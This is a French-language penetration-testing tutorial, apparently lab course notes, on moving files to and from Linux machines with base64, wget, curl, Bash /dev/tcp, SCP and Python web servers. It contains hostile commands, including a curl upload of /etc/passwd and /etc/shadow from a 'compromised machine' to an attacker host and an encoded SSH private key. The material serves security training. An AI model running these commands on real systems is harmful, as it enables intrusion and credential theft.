# Méthodes de transfert de fichiers Linux

Linux est un système d'exploitation polyvalent, qui dispose généralement de nombreux outils différents que nous pouvons utiliser pour effectuer des transferts de fichiers. Comprendre les méthodes de transfert de fichiers sous Linux peut aider les attaquants et les défenseurs à améliorer leurs compétences pour attaquer les réseaux et prévenir les attaques sophistiquées.

Il y a quelques années, nous avons été contactés pour effectuer une réponse à incident sur certains serveurs web. Nous avons trouvé plusieurs acteurs de la menace dans six des neuf serveurs Web que nous avons étudiés. L'auteur de la menace a trouvé une vulnérabilité d'injection SQL. Ils ont utilisé un script Bash qui, une fois exécuté, a tenté de télécharger un autre logiciel malveillant qui s'est connecté au serveur de commande et de contrôle de l'auteur de la menace.

Le script Bash qu'ils ont utilisé a essayé trois méthodes de téléchargement pour obtenir l'autre élément de logiciel malveillant qui s'est connecté au serveur de commande et de contrôle. Sa première tentative a été d'utiliser cURL. Si cela échouait, il tentait d'utiliser wget, et si cela échouait, il utilisait Python. Les trois méthodes utilisent HTTP pour communiquer.

Bien que Linux puisse communiquer via FTP, SMB comme Windows, la plupart des logiciels malveillants sur tous les différents systèmes d'exploitation utilisent HTTP et HTTPS pour la communication.

Cette section passera en revue plusieurs façons de transférer des fichiers sur Linux, y compris HTTP, Bash, SSH, etc.

## Download

### Encodage / Décodage Base64
Selon la taille du fichier que nous voulons transférer, nous pouvons utiliser une méthode qui ne nécessite pas de communication réseau. Si nous avons accès à un terminal, nous pouvons encoder un fichier dans une chaîne base64, copier son contenu dans le terminal et effectuer l'opération inverse. Voyons comment nous pouvons faire cela avec Bash.

Nous utilisons cat pour imprimer le contenu du fichier et codez la sortie en base64 à l'aide d'un tube |. Nous avons utilisé l'option -w 0 pour créer une seule ligne et nous nous sommes retrouvés avec la commande avec un point-virgule ( ; ) et le mot-clé echo pour commencer une nouvelle ligne et faciliter la copie.

### Pwnbox - Encoder la clé SSH en Base64
```
dsgsec@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

Nous copions ce contenu, le collons sur notre machine cible Linux et utilisons base64 avec l'option `-d' pour le décoder.

### Linux - Décoder le fichier
```
dsgsec@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa

```

### Téléchargements Web avec Wget et cURL
Deux des utilitaires les plus courants dans les distributions Linux pour interagir avec les applications Web sont wget et curl. Ces outils sont installés sur de nombreuses distributions Linux.

Pour télécharger un fichier en utilisant wget, nous devons spécifier l'URL et l'option `-O' pour définir le nom du fichier de sortie.

### Télécharger un fichier à l'aide de wget
```
dsgsec@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

cURL est très similaire à wget, mais l'option de nom de fichier de sortie est `-o' en minuscules.

### Download a File Using cURL
```
dsgsec@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

```

### Télécharger avec Bash (/dev/tcp)

Il peut également y avoir des situations où aucun des outils de transfert de fichiers bien connus n'est disponible. Tant que Bash version 2.04 ou supérieure est installée (compilée avec --enable-net-redirections), le fichier de périphérique intégré /dev/TCP peut être utilisé pour des téléchargements de fichiers simples.


### Connexion au serveur web
```
dsgsec@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

### Requête HTTP GET
```
dsgsec@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

### SSH Downloads
SSH (ou Secure Shell) est un protocole qui permet un accès sécurisé à des ordinateurs distants. L'implémentation SSH est fournie avec un utilitaire SCP pour le transfert de fichiers à distance qui, par défaut, utilise le protocole SSH.

SCP (copie sécurisée) est un utilitaire de ligne de commande qui vous permet de copier des fichiers et des répertoires entre deux hôtes en toute sécurité. Nous pouvons copier nos fichiers de serveurs locaux vers des serveurs distants et de serveurs distants vers notre machine locale.

SCP est très similaire à copy ou cp, mais au lieu de fournir un chemin local, nous devons spécifier un nom d'utilisateur, l'adresse IP distante ou le nom DNS et les informations d'identification de l'utilisateur.

Avant de commencer à télécharger des fichiers de notre machine Linux cible vers notre Pwnbox, configurons un serveur SSH dans notre Pwnbox.

### Enabling the SSH Server
```
dsgsec@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

### Starting the SSH Server
```
dsgsec@htb[/htb]$ sudo systemctl start ssh
```

### Téléchargement avec SCP
```
dsgsec@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

## Upload

### Upload Web
Comme mentionné dans la section Méthodes de transfert de fichiers Windows, nous pouvons utiliser uploadserver, un module étendu du module Python HTTP.Server, qui comprend une page de téléchargement de fichiers. Pour cet exemple Linux, voyons comment nous pouvons configurer le module uploadserver pour utiliser HTTPS pour une communication sécurisée.

La première chose que nous devons faire est d'installer le module uploadserver.

### Démarrer le serveur Web
```
dsgsec@htb[/htb]$ python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

```
dsgsec@htb[/htb]$ python3 -m uploadserver 8080 

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:8080/) ...
```

Maintenant, depuis notre machine compromise, téléchargeons les fichiers /etc/passwd et /etc/shadow.

### Linux - upload file
```
dsgsec@htb[/htb]$ curl -X POST https://192.168.49.128:8080/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Méthode alternative de transfert de fichiers Web
Étant donné que Python ou php sont généralement installés sur les distributions Linux, le démarrage d'un serveur Web pour transférer des fichiers est simple. De plus, si le serveur que nous avons compromis est un serveur Web, nous pouvons déplacer les fichiers que nous voulons transférer vers le répertoire du serveur Web et y accéder depuis la page Web, ce qui signifie que nous téléchargeons le fichier depuis notre Pwnbox.

Il est possible de mettre en place un serveur Web utilisant différentes langues. Une machine Linux compromise peut ne pas avoir de serveur Web installé. Dans de tels cas, nous pouvons utiliser un mini serveur Web. Ce qui leur manque peut-être en matière de sécurité, ils compensent la flexibilité, car l'emplacement de la racine Web et les ports d'écoute peuvent être rapidement modifiés.

### Linux - Creating a Web Server with Python3
```
dsgsec@htb[/htb]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Téléchargement
```
dsgsec@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```

